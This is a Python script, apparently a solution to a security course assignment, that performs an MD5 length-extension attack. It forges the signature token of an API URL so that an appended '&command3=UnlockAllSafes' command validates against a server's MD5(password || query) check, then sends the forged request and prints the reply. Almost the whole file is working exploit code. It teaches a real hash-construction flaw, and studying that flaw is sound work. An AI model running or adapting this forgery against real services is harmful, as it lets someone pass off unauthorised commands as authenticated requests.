#!/usr/bin/env python3


import sys
import http.client
from urllib.parse import urlparse, quote

from pymd5 import md5, padding

PASSWORD_LEN = 8  
NEW_COMMAND = "&command3=UnlockAllSafes"


def forge_url(url):
    """Given a valid API url, return a new url ending with
    &command3=UnlockAllSafes that will validate against the server's
    (broken) MD5(password || query_suffix) check. Pure function, no
    network access -- this is what test_offline.py exercises."""
    parsed = urlparse(url)
    query = parsed.query


    token_part, signed_suffix = query.split("&", 1)
    assert token_part.startswith("token="), "Unexpected URL format"
    token = token_part[len("token="):]


    orig_len_bytes = PASSWORD_LEN + len(signed_suffix)


    pad_str = padding(orig_len_bytes * 8)


    pad_encoded = quote(pad_str, safe="")


    total_bits_so_far = (orig_len_bytes + len(pad_str)) * 8
    h = md5(state=token, count=total_bits_so_far)
    h.update(NEW_COMMAND)
    forged_token = h.hexdigest()


    new_query = (
        "token=" + forged_token + "&" + signed_suffix + pad_encoded + NEW_COMMAND
    )
    return parsed._replace(query=new_query).geturl()


def safe_print(data: bytes):

    text = data.decode("utf-8", errors="replace")
    visible = "".join(
        ch if ch.isprintable() or ch in "\n\r\t" else f"[{ord(ch):02x}]"
        for ch in text
    )
    print(visible)


def main():
    if len(sys.argv) != 2:
        print("Usage: python3 len_ext_attack.py <url>")
        sys.exit(1)

    new_url = forge_url(sys.argv[1])
    parsed = urlparse(new_url)


    conn = http.client.HTTPSConnection(parsed.hostname, parsed.port or 443)
    conn.request("GET", parsed.path + "?" + parsed.query)
    resp = conn.getresponse()
    body = resp.read()

    safe_print(body)


if __name__ == "__main__":
    main()